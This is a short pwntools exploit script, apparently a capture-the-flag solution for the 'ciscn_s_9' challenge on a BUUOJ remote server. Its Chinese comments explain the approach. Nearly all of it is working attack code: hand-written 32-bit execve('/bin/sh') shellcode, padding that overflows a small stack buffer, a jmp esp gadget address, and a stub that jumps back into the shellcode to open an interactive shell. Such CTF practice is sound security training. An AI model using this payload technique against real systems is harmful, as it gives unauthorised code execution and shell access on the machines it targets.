from pwn import *

# r = process(r'./ciscn_s_9')
r = remote(r'node5.buuoj.cn', 27045)
elf = ELF(r'./ciscn_s_9')
context.arch = 'i386'
context.log_level = 'debug'
'''
hint：
text:08048551 ; void hint()
.text:08048551                 public hint
.text:08048551 hint            proc near
.text:08048551 ; __unwind {
.text:08048551                 push    ebp
.text:08048552                 mov     ebp, esp
.text:08048554                 jmp     esp
.text:08048554 hint            endp
.text:08048554

# 思路为：写shellcode，然后用jmp跳转到shellcode的头，然后执行shellcode
# 因为栈只有0x20大小，所以不能使用pwntools生成的shellcode
'''
hint_addr = 0x8048554

# execve("/bin/sh",NULL,NULL)
'''
该程序是 32 位
系统调用号，即 eax 应该为 0xb
第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
第二个参数，即 ecx 应该为 0
第三个参数，即 edx 应该为 0

# 1、为什么 /bin/sh 要拆成：push 0x68732f2f、push 0x6e69622f ?
# 32位的寄存器（如 ESP、EBP）和栈操作以 4 字节为单位，一次push指令只能压入 32 位（4 字节）的数据
# 而/bin/sh字符串加上终止符\x00共 8 字节（/bin/sh\x00），需要分两次压栈才能完整放入栈中。

# 2、xor edx,edx; push edx
# 将 EDX 寄存器清零, 将EDX的值（0）压入栈中, 作为/bin/sh的终止符\x00
'''
shellcode = '''
    xor eax, eax
    xor edx, edx
    push edx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    mov al, 0xb
    int 0x80
'''
payload = asm(shellcode).ljust(0x24, b'\x00') + p32(hint_addr) + asm('sub esp,0x28; call esp')
r.sendlineafter(b'>', payload)
r.interactive()
